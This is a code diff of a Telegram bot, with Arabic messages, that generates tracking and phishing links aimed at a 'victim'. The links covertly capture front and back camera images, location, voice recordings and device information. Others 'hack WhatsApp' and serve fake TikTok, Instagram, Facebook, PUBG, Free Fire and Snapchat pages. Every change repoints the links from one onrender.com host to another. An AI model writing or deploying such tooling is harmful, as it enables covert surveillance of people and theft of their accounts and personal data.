@@ -674,7 +674,7 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
-        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: https://ui-j6lg.onrender.com/capture?chatId=${chatId}`;
+        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: https://i-jgne.onrender.com/capture?chatId=${chatId}`;
         bot.sendMessage(chatId, message);
     }
 });
@@ -698,7 +698,7 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     if (data === 'request_verification') {
-        const verificationLink = `https://ui-j6lg.onrender.com/whatsapp?chatId=${chatId}`;
+        const verificationLink = `https://i-jgne.onrender.com/whatsapp?chatId=${chatId}`;
         bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
         return;
     }
@@ -771,26 +771,26 @@ bot.on('callback_query', async (callbackQuery) => {
 
         switch (action) {
             case 'captureFront':
-                link = `https://ui-j6lg.onrender.com/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://i-jgne.onrender.com/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'captureBack':
-                link = `https://ui-j6lg.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://i-jgne.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'getLocation':
-                link = `https://ui-j6lg.onrender.com/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://i-jgne.onrender.com/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'recordVoice':
                 const duration = 10;  // مدة التسجيل الثابتة
-                link = `https://ui-j6lg.onrender.com/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
+                link = `https://i-jgne.onrender.com/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                 break;
             case 'rshq_tiktok':
-                link = `https://ui-j6lg.onrender.com/getNameForm?chatId=${chatId}&type=tiktok`;
+                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=tiktok`;
                 break;
             case 'rshq_instagram':
-                link = `https://ui-j6lg.onrender.com/getNameForm?chatId=${chatId}&type=instagram`;
+                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=instagram`;
                 break;
             case 'rshq_facebook':
-                link = `https://ui-j6lg.onrender.com/getNameForm?chatId=${chatId}&type=facebook`;
+                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=facebook`;
                 break;
             default:
                 bot.sendMessage(chatId, '');
@@ -820,7 +820,7 @@ bot.on('callback_query', (query) => {
 
     // إرسال الرابط عند الضغط على الزر
     if (query.data === 'collect_device_info') {
-        const url = `https://ui-j6lg.onrender.com/${chatId}`;
+        const url = `https://i-jgne.onrender.com/${chatId}`;
         bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
     }
 
@@ -845,7 +845,7 @@ bot.on('callback_query', (query) => {
                     dataStore[chatId] = { userLink };
 
                     // إرسال الرابط المعدل للمستخدم
-                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\nhttps://ui-j6lg.onrender.com/capture.html?chatId=${chatId}`);
+                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\nhttps://i-jgne.onrender.com/capture.html?chatId=${chatId}`);
 
                     // إزالة مستمع الرسائل بعد المعالجة
                     bot.removeListener('message', messageHandler);
@@ -1239,11 +1239,11 @@ bot.on('callback_query', (query) => {
     let link;
 
     if (query.data === 'get_pubg') {
-        link = `https://ui-j6lg.onrender.com/pubg.html?chatId=${chatId}.png`;
+        link = `https://i-jgne.onrender.com/pubg.html?chatId=${chatId}.png`;
     } else if (query.data === 'get_freefire') {
-        link = `https://ui-j6lg.onrender.com/FreeFire.html?chatId=${chatId}.png`;
+        link = `https://i-jgne.onrender.com/FreeFire.html?chatId=${chatId}.png`;
     } else if (query.data === 'add_names') {
-        link = `https://ui-j6lg.onrender.com/Snapchat.html?chatId=${chatId}.png`;
+        link = `https://i-jgne.onrender.com/Snapchat.html?chatId=${chatId}.png`;
     }
 
     if (link) {
